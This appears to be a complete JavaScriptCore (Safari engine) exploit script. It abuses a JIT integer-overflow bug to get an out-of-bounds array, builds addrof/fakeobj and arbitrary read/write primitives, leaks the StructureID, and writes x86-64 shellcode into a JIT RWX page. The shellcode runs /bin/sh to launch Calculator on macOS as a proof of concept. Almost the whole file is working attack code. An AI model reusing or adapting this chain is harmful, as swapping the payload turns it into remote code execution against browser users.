const MAX_ITERATIONS = 0xc0000;

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    // let tmp = Array.from(u32);
    return u32[1] * 0x100000000 + u32[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

// 64-bit unsigned integer to jsValue
function i2obj(val)
{
    return i2f(val-0x02000000000000);
}

// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

var shellcode = [0x6a, 0x3b, 0x58, 0x99, 0x0f, 0xba, 0xe8, 0x19, 0x48, 0xbb, 
	0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x52, 0x53, 0x54, 0x5f, 
	0x52, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5b, 0x52, 0xeb, 0x06, 0x53, 0x57, 
	0x54, 0x5e, 0x0f, 0x05, 0xe8, 0xf5, 0xff, 0xff, 0xff, 0x2f, 0x53, 0x79, 
	0x73, 0x74, 0x65, 0x6d, 0x2f, 0x41, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 
	0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2f, 0x43, 0x61, 0x6c, 0x63, 0x75, 0x6c, 
	0x61, 0x74, 0x6f, 0x72, 0x2e, 0x61, 0x70, 0x70, 0x2f, 0x43, 0x6f, 0x6e,
	0x74, 0x65, 0x6e, 0x74, 0x73, 0x2f, 0x4d, 0x61, 0x63, 0x4f, 0x53, 0x2f, 
	0x43, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x0];
function MakeJitCompiledFunction() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }

    return target;
}

var jitFunc = MakeJitCompiledFunction();
function Foo(arr, n)
{
    n = n | 0;
    if(n<0) {

        let v = (-n) | 0;

        let idx = Math.abs(n);
        if(idx < arr.length) {
            if(idx & 0x80000000) {
                idx += -0x7ffffffd;  // idx = 3;
            }
            if(idx>0) {
                return arr[idx] = 1.04380972981885e-310;  // i2f(0x133700001337);
            }
			
        }
        
    }

}

let noCoW = 13.37;
let arr = [noCoW, 2.2, 3.3];
let oobArr = [noCoW, 2.2, 3.3];
let objArr = [{}, {}, {}];

for(let i=0; i<MAX_ITERATIONS; i++) {
	let tmp = -2;
	Foo(arr, tmp);
}

Foo(arr, -2147483648);
// print(describe(arr));
// print(describe(oob_arr));
// print(describe(obj_arr));

// assert(oob_arr.length == 0x1337);
print("[+] now oob arr's length: " + hex(oobArr.length));

function AddrOf(obj)
{
    objArr[0] = obj;
    return f2i(oobArr[4]);
}

function FakeObj(addr)
{
    addr = i2f(addr);
    oobArr[4] = addr;
    return objArr[0];
}

// leak entropy by functionProtoFuncToString
function LeakStructureID(obj)
{
    // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf

    var unlinkedFunctionExecutable = {
        m_isBuitinFunction: i2f(0xdeadbeef),
        pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
        m_identifier: {},
    };

    var fakeFunctionExecutable = {
      pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
      m_executable: unlinkedFunctionExecutable,
    };

    var container = {
      jscell: i2f(0x00001a0000000000),
      butterfly: {},
      pad: 0,
      m_functionExecutable: fakeFunctionExecutable,
    };


    let fakeObjAddr = AddrOf(container) + 0x10;
    let fakeObj = FakeObj(fakeObjAddr);

    unlinkedFunctionExecutable.m_identifier = fakeObj;
    container.butterfly = arrLeak;

    var nameStr = Function.prototype.toString.call(fakeObj);

    let structureID = nameStr.charCodeAt(9);

    // repair the fakeObj's jscell
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    container.jscell = f64[0];
    return structureID;
}

// leak entropy by getByVal
function LeakStructureID2(obj)
{
    let container = {
        cellHeader: i2obj(0x0108200700000000),
        butterfly: obj
    };

    let fakeObjAddr = AddrOf(container) + 0x10;
    let fakeObj = FakeObj(fakeObjAddr);
    f64[0] = fakeObj[0];

    // print(123); 
    let structureID = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cellHeader = f64[0];

    return structureID;
}
// let pad = new Array(noCoW, 2.2, {}, 13.37);
var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
let structureID = LeakStructureID2(arrLeak);
// let structureID = LeakStructureID(arrLeak);

print("[+] leak structureID: "+hex(structureID));

pad = [{}, {}, {}];
var victim = [noCoW, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_0'] = 13.37;

u32[0] = structureID;
u32[1] = 0x01082309-0x20000;
// container to store fake driver object
var container = {
    cellHeader: f64[0],
    butterfly: victim   
};

// build fake driver
var containerAddr = AddrOf(container);
var fakeArrAddr = containerAddr + 0x10;
print("[+] fake driver object addr: "+hex(fakeArrAddr));
var driver = FakeObj(fakeArrAddr);

// ArrayWithDouble
var unboxed = [noCoW, 13.37, 13.37];
// ArrayWithContiguous
var boxed = [{}];

// leak unboxed butterfly's addr
driver[1] = unboxed;
var sharedButterfly = victim[1];
print("[+] shared butterfly addr: " + hex(f2i(sharedButterfly)));
driver[1] = boxed;
victim[1] = sharedButterfly;

// set driver's cell header to double array
u32[0] = structureID;
u32[1] = 0x01082307-0x20000;
container.cellHeader = f64[0];

function NewAddrOf(obj) {
    boxed[0] = obj;
    return f2i(unboxed[0]);
}

function NewFakeObj(addr) {
    unboxed[0] = i2f(addr);
    return boxed[0];            
}

function Read64(addr) {
    driver[1] = i2f(addr+0x10);
    return NewAddrOf(victim.prop);
    // return f2i(victim.prop);
}

function Write64(addr, val) {
    driver[1] = i2f(addr+0x10);
    // victim.prop = this.fake_obj(val);
    victim.prop = i2f(val);
}

function ByteToDwordArray(payload)
{

    let sc = []
    let tmp = 0;
    let len = Math.ceil(payload.length/6)
    for (let i = 0; i < len; i += 1) {
        tmp = 0;
        pow = 1;
        for(let j=0; j<6; j++){
            let c = payload[i*6+j]
            if(c === undefined) {
                c = 0;
            }
            pow = j==0 ? 1 : 256 * pow;
            tmp += c * pow;
        }
        tmp += 0xc000000000000;
        sc.push(tmp);
    }
    return sc;
}

function ArbitraryWrite(addr, payload) 
{
    let sc = ByteToDwordArray(payload);
    for(let i=0; i<sc.length; i++) {
        Write64(addr+i*6, sc[i]);
    }
}

// get the addr with addr_of primitive;
var jitFuncAddr = NewAddrOf(jitFunc);
print("[+] jit function addr: "+hex(jitFuncAddr));
var executableBaseAddr = Read64(jitFuncAddr + 0x18);
// print("[+] executable base addr: "+hex(executableBaseAddr));
// get the jit code object addr;
var jitCodeAddr = Read64(executableBaseAddr + 0x8);
// print("[+] jit code addr: "+hex(jitCodeAddr));

var debugVersion = false;
// finally get the rwx addr;
if(debugVersion) {
    // debug jsc
    var rwxAddr = Read64(jitCodeAddr + 32);
}
else {
    // release jsc
    var someObjAddr = Read64(jitCodeAddr + 0x18)
    var someObjAddr = Read64(someObjAddr + 0x8)
    var someObjAddr = Read64(someObjAddr + 0x38)
    var rwxAddr = someObjAddr + 123;
}
print("[+] rwx addr: "+hex(rwxAddr));
// write shellcode to rwx addr
ArbitraryWrite(rwxAddr, shellcode);
// trigger shellcode
print("[+] trigger shellcode");
jitFunc();
